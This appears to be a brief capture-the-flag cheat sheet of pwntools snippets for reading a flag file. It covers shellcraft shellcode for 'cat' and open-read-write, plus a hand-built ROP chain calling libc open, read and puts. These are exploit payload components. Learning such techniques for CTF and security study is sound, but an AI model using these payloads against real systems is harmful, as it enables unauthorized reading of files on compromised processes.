## Cat

```py
asm(shellcraft.cat('/flag'))	# 0x23 bytes
```



## ORW

```py
asm(shellcraft.open('/flag', 0) + shellcraft.read(3, heap_base, 0x100) + shellcraft.write(1, heap_base, 0x100))
```



## Manually

```python
# gadgets
open_addr = libc_base + libc.sym['open']
read_addr = libc_base + libc.sym['read']
puts_addr = libc_base + libc.sym['puts']

pl = flat({
    # open
    0x0:  p_rdi_r,
    0x8:  heap_addr + 0xb20,    # file name on chunk 
    0x10: p_rsi_r,
    0x18: 0,
    0x20: open_addr,
    # read
    0x28: p_rdi_r,
    0x30: 4,
    0x38: p_rsi_r,
    0x40: heap_addr + 0x3d0,    # empty space
    0x48: p_rdx_r12_r,
    0x50: 30,
    0x58: 30,
    0x60: read_addr,
    # write
    0x68: p_rdi_r,
    0x70: heap_addr + 0x3d0,	# the empty space
    0x78: puts_addr,
    }, filler='\0')
```

